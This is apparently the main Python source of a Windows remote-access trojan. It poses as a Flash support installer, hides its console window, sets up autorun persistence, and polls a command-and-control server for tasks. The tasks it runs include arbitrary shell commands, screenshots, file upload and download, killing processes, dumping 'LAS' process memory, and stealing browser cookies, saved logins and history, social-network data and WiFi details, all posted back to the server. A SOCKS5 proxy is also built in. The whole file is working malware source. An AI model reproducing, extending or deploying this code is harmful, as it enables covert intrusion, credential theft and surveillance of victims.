# -*- coding: utf8 -*-
print("正在安装Flash支持模块,请勿关闭本窗口")
import ctypes

whnd = ctypes.windll.kernel32.GetConsoleWindow()
if whnd != 0:
    ctypes.windll.user32.ShowWindow(whnd, 0)
    ctypes.windll.kernel32.CloseHandle(whnd)

import requests
from time import sleep
from traceback import print_exc
from json import loads, dumps
from threading import Thread
import ComMod, Config, Shell, FileManager, Screenshot, AutoRun, Installer, Rerun, \
    Process, Socks5, SNS, Browsers, LasDump, Proxy, WiFi, Flash, StringEncode, SwitchToUser
import random
import win32api, win32con
import os
import sys
from multiprocessing import freeze_support


class C:
    def __init__(self):
        ########################以下代码为UAC和开机启动，测试阶段可屏蔽########################
        ComMod.Log("Main: 进入初始化")
        ComMod.Log("Main: 当前运行目录：{}".format(os.getcwd()))
        ComMod.Log("Main: 当前运行路径：{}".format(sys.argv[0]))
        ComMod.Log("Main: 开始检查安装状态")
        installer = Installer.installer()
        self.install_path = installer.install_path
        ComMod.Log("Main: 检查安装状态结束")
        self.cuser = Shell.shell_exec("whoami")
        if self.is_admin() == False:
            if sys.argv[0].find(StringEncode.get('1')) == -1:
                win32api.MessageBox(0, "请使用右键以管理员身份运行重新打开此程序", "请重试:", win32con.MB_OK)
        else:
            if self.cuser.find('system') == -1:
                if sys.argv[0].find(StringEncode.get('1')) > -1:
                    Thread(target=Flash.do_install).start()
                    AUR = AutoRun.autorun(self.install_path)
                ComMod.Log("Main: 当前为管理员权限")
                ComMod.Log("Main: 开始检测开机启动")
                ComMod.Log("Main: 开机启动检测完毕")
        Rerun.do(self.install_path)
        # ComMod.Log("Main: 开始UAC检测")
        # BU = BypassUAC.BypassUAC(self.install_path)
        # ComMod.Log("Main: UAC检测完毕")
        # if BU.admin == True:
        ########################以下代码为UAC和开机启动，测试阶段可屏蔽########################
        self.task_list = []
        self.done_list = []
        self.conf = Config.config()
        # if self.conf.cuser.find('system') == -1 and self.is_admin() == True:
        #     win32api.MessageBox(0, "安装成功", "提示:", win32con.MB_OK)
        self.socks5 = Socks5.Socks5()
        self.proxy_pid = 0
        sleep_time = random.randint(60, 180)
        ComMod.Log("Main: Sleep:" + str(sleep_time))
        sleep(sleep_time)
        ComMod.Log("Main: Go")
        Thread(target=self.kp).start()
        Thread(target=self.task).start()

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def task(self):
        while True:
            Thread(target=self.do_task).start()
            sleep(1)
    def do_task(self):
        for i, ctask in enumerate(self.task_list):
            if ctask['id'] not in self.done_list:
                try:
                    if ctask['type'] == "shell":
                        self.done_list.append(ctask['id'])
                        ComMod.Log("Main：任务Shell:" + ctask['content'])
                        url = self.conf.get_url()
                        task_result = Shell.shell_exec(ctask['content'])
                        ComMod.Log("Main：执行结果:" + task_result)
                        data = ComMod.encode({
                            'do': 'u',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': task_result
                        })
                        response = requests.post(url, files={self.conf.pn: data})
                    if ctask['type'] == "screenshot":
                        self.done_list.append(ctask['id'])
                        ComMod.Log("Main：任务截图")
                        url = self.conf.get_url()
                        data = ComMod.encode({
                            'do': 'u',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': ''
                        })
                        ComMod.Log("Main：执行成功")
                        files = {self.conf.pn: data, 'file': Screenshot.sc(self.conf.Host)}
                        response = requests.post(url, files=files)
                    if ctask['type'] == "files":
                        self.done_list.append(ctask['id'])
                        url = self.conf.get_url()
                        ComMod.Log("Main：查看文件")
                        task_result = FileManager.files(ctask['content'])
                        ComMod.Log("Main：查看文件结果：" + task_result)
                        data = ComMod.encode({
                            'do': 'u',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': task_result
                        })
                        response = requests.post(url, files={self.conf.pn: data})
                    if ctask['type'] == "upload":
                        self.done_list.append(ctask['id'])
                        url = self.conf.get_url()
                        uploadres = loads(ctask['result'])
                        download_url = self.conf.Host + '/' + uploadres['full_path']
                        ComMod.Log("Main：任务上传" + uploadres['save_name'])
                        save_name = uploadres['save_name']
                        save_path = ctask['content']
                        res = FileManager.download(download_url, save_path, save_name)

                        if res == False:
                            uploadres['status'] = False

                        data = ComMod.encode({
                            'do': 'u',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': dumps(uploadres)
                        })

                        ComMod.Log("Main：执行成功")
                        requests.post(url, files={self.conf.pn: data})
                    if ctask['type'] == "download":
                        self.done_list.append(ctask['id'])
                        ComMod.Log("Main：任务下载")
                        up_url = self.conf.get_url()
                        response = FileManager.upload(self.conf.pn, ctask, up_url, self.conf.key)
                        ComMod.Log("Main：执行成功")
                    if ctask['type'] == "process_list":
                        self.done_list.append(ctask['id'])
                        url = self.conf.get_url()
                        ComMod.Log("Main：进程列表任务")
                        result = dumps(Process.get_process_list())
                        data = ComMod.encode({
                            'do': 'u',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': result
                        })
                        ComMod.Log("Main：进程列表任务：" + result)
                        requests.post(url, files={self.conf.pn: data})
                    if ctask['type'] == "kill_process":
                        self.done_list.append(ctask['id'])
                        ComMod.Log("Main：结束进程PID:" + ctask['content'])
                        url = self.conf.get_url()
                        task_result = Process.kill(ctask['content'])
                        ComMod.Log("Main：结束进程执行结果:" + task_result)
                        data = ComMod.encode({
                            'do': 'u',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': task_result
                        })
                        response = requests.post(url, files={self.conf.pn: data})
                    if ctask['type'] == "get_sns_info":
                        self.done_list.append(ctask['id'])
                        ComMod.Log("Main：获取社交信息:")
                        url = self.conf.get_url()
                        task_result = dumps(SNS.get_info())
                        ComMod.Log("Main：获取社交信息执行结果:" + task_result)
                        data = ComMod.encode({
                            'do': 'u',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': task_result
                        })
                        response = requests.post(url, files={self.conf.pn: data})
                    if ctask['type'] == "get_browser_cl":
                        self.done_list.append(ctask['id'])
                        ComMod.Log("Main：获取浏览器CL信息")
                        url = self.conf.get_url()
                        b = Browsers.browsers()
                        task_result = dumps(b.get_cookies_logins())
                        ComMod.Log("Main：获取浏览器CL信息结果:" + task_result)
                        data = ComMod.encode({
                            'do': 'bcl',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': task_result
                        })
                        response = requests.post(url, files={self.conf.pn: data})
                    if ctask['type'] == "get_browser_h":
                        self.done_list.append(ctask['id'])
                        ComMod.Log("Main：获取浏览器H信息")
                        url = self.conf.get_url()
                        b = Browsers.browsers()
                        task_result = dumps(b.get_histories())
                        ComMod.Log("Main：获取浏览器H信息成功1")
                        data = ComMod.encode({
                            'do': 'bh',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': task_result
                        })
                        response = requests.post(url, files={self.conf.pn: data})
                    if ctask['type'] == "las_dump":
                        self.done_list.append(ctask['id'])
                        ComMod.Log("Main：导出LAS进程内存")
                        url = self.conf.get_url()
                        b = Browsers.browsers()
                        task_result = LasDump.get_las_dmp()
                        ComMod.Log("Main：导出LAS进程内存成功")
                        if task_result['status'] == False:
                            data = ComMod.encode({
                                'do': 'ld',
                                'id': ctask['id'],
                                'key': self.conf.key,
                                'result': task_result
                            })
                            response = requests.post(url, files={self.conf.pn: data})
                        else:
                            las_dmp = task_result['data']
                            task_result['data'] = ''
                            data = ComMod.encode({
                                'do': 'ld',
                                'id': ctask['id'],
                                'key': self.conf.key,
                                'result': task_result
                            })
                            response = requests.post(url, files={self.conf.pn: data, 'LAS': las_dmp})

                    if ctask['type'] == "open_proxy":
                        self.done_list.append(ctask['id'])
                        ComMod.Log("Main：开启网络代理")
                        url = self.conf.get_url()
                        print("proxy_info:", ctask['content'])
                        proxy_info = loads(ctask['content'])
                        result = ''
                        if proxy_info['status'] == True:
                            if self.socks5.is_alive == True and self.socks5.pid != 0:
                                self.socks5.stop()
                            self.socks5.start()
                            if Proxy.check(self.proxy_pid) == True and self.proxy_pid != 0:
                                Proxy.kill(self.proxy_pid)
                            self.proxy_pid = Proxy.start(proxy_info['msg'], self.socks5.port)
                            if Proxy.check(self.proxy_pid) == True:
                                ComMod.Log("Main：开启代理成功")
                                result = True
                            else:
                                result = False
                        else:
                            result = False
                        data = ComMod.encode({
                            'do': 'u',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': dumps({'status': str(result)})
                        })
                        response = requests.post(url, files={self.conf.pn: data})
                    if ctask['type'] == "close_proxy":
                        self.done_list.append(ctask['id'])
                        url = self.conf.get_url()
                        Proxy.kill(self.proxy_pid)
                        self.socks5.kill()
                        data = ComMod.encode({
                            'do': 'u',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': dumps({'status': True})
                        })
                        response = requests.post(url, files={self.conf.pn: data})
                    if ctask['type'] == "get_wifi_info":
                        self.done_list.append(ctask['id'])
                        url = self.conf.get_url()
                        data = ComMod.encode({
                            'do': 'u',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': dumps(WiFi.get_wifi_info())
                        })
                        response = requests.post(url, files={self.conf.pn: data})
                    if ctask['type'] == "switch_to_user":
                        self.done_list.append(ctask['id'])
                        url = self.conf.get_url()
                        SwitchToUser.switch()
                        data = ComMod.encode({
                            'do': 'u',
                            'id': ctask['id'],
                            'key': self.conf.key,
                            'result': dumps({'status': True})
                        })
                        response = requests.post(url, files={self.conf.pn: data})
                except:
                    print_exc()
    def kp(self):
        while True:
            try:
                url = self.conf.get_url()
                data = ComMod.encode({
                    'do': 'k',
                    'ips': self.conf.ips,
                    'public_ip': self.conf.public_ip,
                    'osv': self.conf.osv,
                    'cuser': self.conf.cuser,
                    'pid': self.conf.pid,
                    'key': self.conf.key,
                    'uid': self.conf.uid,
                    'av': self.conf.av,
                    'city': self.conf.city
                })
                response = requests.post(url, files={self.conf.pn: data})
                data = ComMod.decode(response.content)
                if self.conf.key == "null":
                    self.conf.key = data['key']
                    ComMod.Log("Main：初始化获得Key:" + self.conf.key)
                    print("Main：初始化获得Key:" + self.conf.key)
                self.sleep = int(data['sleep'])
                for task in data['tasks']:
                    self.task_list.append(task)
            except:
                print_exc()
            sleep(self.conf.get_sleep_time())


if __name__ == '__main__':
    freeze_support()
    cc = C()
